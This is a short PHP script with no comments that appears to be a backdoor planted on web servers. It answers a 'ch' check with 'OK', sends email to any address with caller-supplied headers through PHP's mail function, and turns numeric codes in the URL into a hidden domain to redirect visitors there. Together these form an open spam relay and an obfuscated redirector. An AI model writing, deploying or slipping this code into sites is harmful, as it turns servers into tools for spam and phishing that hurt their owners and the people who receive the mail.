<?php
if ($_GET ['ch']) {
	echo "OK";
	exit ();
}

if($_POST['to'])
{
	$to = $_POST ['to'];
	$subject = stripslashes ( $_POST ['subj'] );
	$message = stripslashes ( $_POST ['mes'] );
	$headers = stripslashes ( $_POST ['headers'] );
	
	if (mail ( $to, $subject, $message, $headers )) {
		echo "Message sent successfully";
	} else {
		echo "An error occured";
	}
}

if (! $_POST['to'] && ! $_GET ['ch'] && count($_GET) > 0) {
	$arr = array (
		1 => 'a',
			2 => 'b',
			3 => 'c',
			4 => 'd',
			5 => 'e',
			6 => 'f',
			7 => 'g',
			8 => 'h',
			9 => 'i',
			10 => 'j',
			11 => 'k',
			12 => 'l',
			13 => 'm',
			14 => 'n',
			15 => 'o',
			16 => 'p',
			17 => 'q',
			18 => 'r',
			19 => 's',
			20 => 't',
			21 => 'u',
			22 => 'v',
			23 => 'w',
			24 => 'x',
			25 => 'y',
			26 => 'z',
			27 => '.',
			28 => '1',
			29 => '2',
			30 => '3',
			31 => '4',
			32 => '5',
			33 => '6',
			34 => '7',
			35 => '8',
			36 => '9',
			37 => '0'
	);
	
	$var = key ( $_GET );
	
	$var_arr = explode ( "-", $var );
	
	foreach ( $var_arr as $value ) {
		preg_match_all ( "~\d+~", $value, $matches );
		
		$value = implode ( "", $matches [0] );
		
		if ($value > sizeof ( $arr )) {
			for($i = $value; $i > sizeof ( $arr ); $i = $i - sizeof ( $arr )) {
				$value = $i;
			}
			
			$value -= sizeof ( $arr );
		}
		
		$string .= $arr [$value];
	}
	
	$link = $string . $_GET [$var];
	
	header ( "Location: http://{$link}" );
}